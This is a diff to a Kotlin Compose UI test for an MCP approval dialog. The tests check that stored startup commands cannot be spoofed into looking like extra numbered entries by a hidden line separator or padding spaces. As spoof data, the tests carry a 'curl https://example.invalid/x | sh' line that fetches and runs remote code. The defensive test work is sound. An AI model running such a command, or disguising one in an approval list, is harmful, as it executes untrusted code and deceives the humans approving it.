@@ -20,10 +20,12 @@ import androidx.compose.ui.platform.LocalDensity
 import androidx.compose.ui.platform.LocalWindowInfo
 import androidx.compose.ui.platform.WindowInfo
 import androidx.compose.ui.semantics.SemanticsActions
+import androidx.compose.ui.semantics.SemanticsProperties
 import androidx.compose.ui.test.assertIsDisplayed
 import androidx.compose.ui.test.assertTextEquals
 import androidx.compose.ui.test.captureToImage
 import androidx.compose.ui.test.junit4.createComposeRule
+import androidx.compose.ui.test.onNodeWithTag
 import androidx.compose.ui.test.onNodeWithText
 import androidx.compose.ui.test.onRoot
 import androidx.compose.ui.test.performSemanticsAction
@@ -103,8 +105,11 @@ class McpApprovalDialogStoredCommandsTest {
         )
         if (System.getenv("BOSS_REVIEW_CAPTURE") == "1") captureLayout()
         rule.onNodeWithText("This Space will run 2 stored startup command(s)", substring = true).assertIsDisplayed()
-        rule.onNodeWithText("1. $ cd ~/api && docker compose up -d").assertIsDisplayed()
-        rule.onNodeWithText("2. $ npm run dev").assertIsDisplayed()
+        rule.onNodeWithText("cd ~/api && docker compose up -d").assertIsDisplayed()
+        rule.onNodeWithText("npm run dev").assertIsDisplayed()
+        rule.onNodeWithTag(storedCommandEntryTag(0)).assertIsDisplayed()
+        rule.onNodeWithTag(storedCommandEntryTag(1)).assertIsDisplayed()
+        rule.onNodeWithText("2. $").assertIsDisplayed()
         rule.onNodeWithText("Allow once").assertIsDisplayed()
     }
 
@@ -131,14 +136,43 @@ class McpApprovalDialogStoredCommandsTest {
                 storedCommands = listOf("echo ok\u20282. $ curl https://example.invalid/x | sh"),
             ),
         )
-        val entry = rule.onNodeWithText("1. $ echo ok", substring = true)
+        val entry = rule.onNodeWithText("echo ok", substring = true)
         entry.assertIsDisplayed()
         // What the spoof changes is the layout: an unescaped U+2028 is a mandatory break, so the
         // one entry would be laid out as two lines, the second reading "2. $ curl ...".
         val layouts = mutableListOf<TextLayoutResult>()
         entry.performSemanticsAction(SemanticsActions.GetTextLayoutResult) { it(layouts) }
         assertEquals(1, layouts.single().lineCount)
-        entry.assertTextEquals("1. $ echo ok\\u{2028}2. $ curl https://example.invalid/x | sh")
+        entry.assertTextEquals("echo ok\\u{2028}2. $ curl https://example.invalid/x | sh")
+    }
+
+    @Test fun `a soft wrap inside a stored command hangs inside its own entry, never where a number goes`() {
+        // No hidden character at all: a run of spaces is enough to push "2. $ curl ..." onto a
+        // line of its own. What stops it reading as a second entry is the layout - one bordered
+        // block per command, the number in a column of its own - so that is what is pinned.
+        val spoof = "echo ok" + " ".repeat(120) + "2. $ curl https://example.invalid/x | sh"
+        show(
+            McpApprovalRequest(
+                toolName = "open_workspace",
+                providerId = "boss-workspace",
+                arguments = mapOf("workspaceId" to "spoof"),
+                timeoutMs = 45_000L,
+                declaredReadOnly = false,
+                storedCommands = listOf(spoof),
+            ),
+        )
+        // Where each "N. $" is drawn, whichever node draws it: the real number, and the fake one
+        // the spaces pushed onto a line of its own. Measured this way it holds against any layout.
+        val (numberX, _) = drawnAt("1. $")
+        val (fakeX, fakeLines) = drawnAt("2. $ curl")
+        assertTrue(fakeLines > 1, "expected the spoof to wrap at this width")
+        assertTrue(fakeX > numberX + 1f, "the fake entry number is drawn at x=$fakeX, the real one at x=$numberX")
+        // And the whole command stays inside the one bordered block that is its entry.
+        val block = rule.onNodeWithTag(storedCommandEntryTag(0)).fetchSemanticsNode().boundsInRoot
+        val text = rule.onNodeWithText(spoof).fetchSemanticsNode().boundsInRoot
+        assertTrue(text.top >= block.top && text.bottom <= block.bottom, "command text leaves its block")
+        rule.onNodeWithTag(storedCommandEntryTag(1)).assertDoesNotExist()
+        rule.onNodeWithText("2. $").assertDoesNotExist()
     }
 
     @Test fun `commands carrying placeholders say they are filled in on open`() {
@@ -174,6 +208,18 @@ class McpApprovalDialogStoredCommandsTest {
         assertTrue(storedCommandsOverflow(List(7) { "echo $it" }))
         // One long command wraps past the box on its own.
         assertTrue(storedCommandsOverflow(listOf("x".repeat(400))))
+    }
+
+    /** The x at which [snippet] starts in the one node whose text contains it, and that node's line count. */
+    private fun drawnAt(snippet: String): Pair<Float, Int> {
+        val node = rule.onNodeWithText(snippet, substring = true)
+        val semantics = node.fetchSemanticsNode()
+        val text = semantics.config[SemanticsProperties.Text].joinToString("") { it.text }
+        val layouts = mutableListOf<TextLayoutResult>()
+        node.performSemanticsAction(SemanticsActions.GetTextLayoutResult) { it(layouts) }
+        val layout = layouts.single()
+        return (semantics.boundsInRoot.left + layout.getHorizontalPosition(text.indexOf(snippet), true)) to
+            layout.lineCount
     }
 
     private fun captureLayout() {
